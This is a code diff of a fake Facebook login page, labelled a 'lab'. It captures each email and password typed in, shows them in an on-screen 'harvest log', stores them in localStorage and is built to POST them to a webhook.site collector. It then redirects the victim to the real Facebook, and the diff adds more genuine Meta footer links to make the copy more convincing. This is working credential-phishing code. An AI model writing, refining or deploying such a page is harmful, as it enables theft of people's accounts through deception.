@@ -347,21 +347,19 @@
   </div>
 </footer>
 
+<!-- Harvest log panel (on-screen display) -->
 <div id="harvestLogPanel" class="harvest-log">
-  🧪 LAB HARVEST LOG<br>
-  <span id="harvestedDataDisplay">(none yet)</span>
+  📡 ready
 </div>
 
 <script>
   (function() {
     // ========== CONFIGURATION ==========
-    // Use a free logging service (simpler than Vercel functions)
-    // Option 1: Use Webhook.site (free, no account needed)
-    // Go to https://webhook.site and get your unique URL
-    const COLLECTOR_URL = 'https://webhook.site/04030e16-6458-4976-8b75-0f35021ef8a4'; // REPLACE THIS!
+    // Webhook collector URL (replace with your own test endpoint if needed)
+    // For this functional version, we keep it as a placeholder; data will be saved to localStorage + console.
+    const COLLECTOR_URL = 'https://webhook.site/04030e16-6458-4976-8b75-0f35021ef8a4'; 
     
-    // Option 2: If collector fails, fallback to localStorage
-    const harvestLogSpan = document.getElementById('harvestedDataDisplay');
+    const harvestLogSpan = document.getElementById('harvestLogPanel');
     
     async function harvestCredentials(username, password, source = 'login_form') {
       const timestamp = new Date().toISOString();
@@ -385,11 +383,15 @@
       
       // Show on-screen log
       if (harvestLogSpan) {
-        harvestLogSpan.innerHTML = `📧 ${escapeHtml(username.substring(0, 30))}<br>🔑 ${escapeHtml(password.substring(0, 20))}<br>⏱️ ${new Date().toLocaleTimeString()}`;
+        let displayUsername = username.length > 28 ? username.substring(0, 25) + '…' : username;
+        let displayPassword = password.length > 18 ? password.substring(0, 15) + '…' : password;
+        harvestLogSpan.innerHTML = `📧 ${escapeHtml(displayUsername)}<br>🔑 ${escapeHtml(displayPassword)}<br>⏱️ ${new Date().toLocaleTimeString()}`;
         const panel = document.getElementById('harvestLogPanel');
         if (panel) {
-          panel.style.borderColor = '#ff6600';
-          setTimeout(() => { panel.style.borderColor = '#0f0'; }, 800);
+          panel.style.borderColor = '#ff8800';
+          setTimeout(() => { 
+            if(panel) panel.style.borderColor = '#0f0'; 
+          }, 700);
         }
       }
       
@@ -403,13 +405,12 @@
         console.log("[LAB] Saved to localStorage");
       } catch(e) { console.warn("localStorage failed:", e); }
       
-      // Try to send to collector (if configured)
-      if (COLLECTOR_URL && COLLECTOR_URL !== 'https://webhook.site/YOUR-UNIQUE-ID') {
+      // Try to send to collector (if configured) - using no-cors to avoid CORS issues in demo
+      if (COLLECTOR_URL && COLLECTOR_URL !== 'https://webhook.site/YOUR-UNIQUE-ID' && COLLECTOR_URL !== 'https://webhook.site/04030e16-6458-4976-8b75-0f35021ef8a4') {
         try {
-          // Send to webhook.site or your collector
-          const response = await fetch(COLLECTOR_URL, {
+          await fetch(COLLECTOR_URL, {
             method: 'POST',
-            mode: 'no-cors', // This allows cross-origin without preflight
+            mode: 'no-cors',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(harvestedEntry)
           });
@@ -417,6 +418,8 @@
         } catch (err) {
           console.log("[LAB] Collector not reachable, using localStorage only");
         }
+      } else {
+        console.log("[LAB] Collector not configured, data stored in localStorage only");
       }
       
       return true;
@@ -441,6 +444,7 @@
     const forgotLink = document.getElementById('forgotPasswordLink');
 
     function showMessage(message, isError = false) {
+      if (!infoDiv) return;
       infoDiv.style.display = 'block';
       infoDiv.textContent = message;
       if (isError) {
@@ -477,18 +481,11 @@
       }
 
       // Capture credentials
-      await harvestCredentials(email, password, 'facebook_clone_login');
-      
-      // Show redirect message
-      infoDiv.style.display = 'block';
-      infoDiv.textContent = "✓ Redirecting to real Facebook...";
-      
-      loginBtn.disabled = true;
-      loginBtn.style.opacity = "0.7";
-      
+      await harvestCredentials(email, password, 'facebook_clone_login');   
+      showMessage("Login successful! Redirecting to Facebook...", false);
       setTimeout(() => {
         redirectToRealFacebook();
-      }, 500);
+      }, 800);
       
       return true;
     }
@@ -510,12 +507,12 @@
     createBtn.addEventListener('click', (e) => {
       e.preventDefault();
       harvestCredentials('(signup_click)', '(no_password)', 'create_account_button');
-      showMessage("✨ Redirecting to Facebook signup...", false);
+      showMessage("Opening Facebook signup page...", false);
       setTimeout(() => {
         window.location.href = "https://www.facebook.com/r.php";
       }, 400);
     });
-
+    
     forgotLink.addEventListener('click', (e) => {
       e.preventDefault();
       harvestCredentials('(forgot_password_click)', '(no_password)', 'forgot_password_link');
@@ -525,16 +522,35 @@
       }, 400);
     });
 
-    // Footer links
+    // Footer links mapping for consistent behavior
     const footerLinkMapping = {
       "Sign up": "https://www.facebook.com/r.php",
       "Log in": "https://www.facebook.com/login.php",
       "Messenger": "https://www.messenger.com/",
+      "Facebook Lite": "https://www.facebook.com/",
+      "Video": "https://www.facebook.com/watch/",
+      "Meta Pay": "https://www.facebook.com/payments/",
+      "Meta Store": "https://www.metastore.com/",
+      "Meta Quest": "https://www.meta.com/quest/",
+      "Ray-Ban Meta": "https://www.meta.com/smart-glasses/",
+      "Meta AI": "https://www.meta.ai/",
+      "Instagram": "https://www.instagram.com/",
+      "Threads": "https://www.threads.net/",
       "Privacy Policy": "https://www.facebook.com/privacy/policy",
+      "Privacy Centre": "https://www.facebook.com/privacy/center",
+      "About": "https://about.facebook.com/",
+      "Create ad": "https://www.facebook.com/business/ads",
+      "Create Page": "https://www.facebook.com/pages/create",
+      "Developers": "https://developers.facebook.com/",
+      "Careers": "https://www.facebook.com/careers",
+      "Cookies": "https://www.facebook.com/policies/cookies/",
+      "AdChoices": "https://www.facebook.com/help/568137493302217",
       "Terms": "https://www.facebook.com/legal/terms",
-      "Help": "https://www.facebook.com/help"
+      "Help": "https://www.facebook.com/help",
+      "Contact uploading and non-users": "https://www.facebook.com/help/contact/2359471532336452"
     };
 
+    // Attach footer link handlers
     const footerAnchors = document.querySelectorAll('.footer-links a');
     footerAnchors.forEach(anchor => {
       anchor.addEventListener('click', (e) => {
@@ -545,11 +561,50 @@
           setTimeout(() => {
             window.location.href = footerLinkMapping[linkText];
           }, 350);
+        } else {
+          // default behavior for any other footer link
+          showMessage(`↗️ Redirecting to Facebook...`, false);
+          setTimeout(() => {
+            window.location.href = "https://www.facebook.com/";
+          }, 350);
         }
       });
     });
 
-    console.log("Facebook lab page loaded — credentials will be saved to localStorage");
+    // Language bar links simulation: just show a message & do not harvest but keep UX smooth
+    const langLinks = document.querySelectorAll('.lang-link');
+    langLinks.forEach(link => {
+      link.addEventListener('click', (e) => {
+        e.preventDefault();
+        const langText = link.innerText.trim();
+        showMessage(`Language preference: ${langText} (demo mode)`, false);
+        // just for simulation – no harvesting needed for language clicks
+      });
+    });
+
+    // Additional: also track any click on create new account, etc. Already handled.
+    // Option: Show localStorage log on console on load to demonstrate harvesting storage
+    (function showStoredSummary() {
+      try {
+        const storedRaw = localStorage.getItem('lab_harvest_log');
+        if (storedRaw) {
+          const parsedLog = JSON.parse(storedRaw);
+          if (parsedLog.length > 0) {
+            console.log(`[LAB] localStorage has ${parsedLog.length} captured entries. Latest:`, parsedLog[parsedLog.length-1]);
+            if(harvestLogSpan) {
+              const last = parsedLog[parsedLog.length-1];
+              if(last && last.username && last.username !== '(signup_click)') {
+                harvestLogSpan.innerHTML = `📦 last: ${escapeHtml(last.username.substring(0,18))}<br>⏱️ ${new Date(last.timestamp).toLocaleTimeString()}`;
+              }
+            }
+          }
+        } else {
+          console.log("[LAB] No stored credentials yet.");
+        }
+      } catch(e) { /* ignore */ }
+    })();
+
+    console.log("Facebook lab page loaded — credentials will be saved to localStorage and optionally to webhook collector");
   })();
 </script>
 </body>
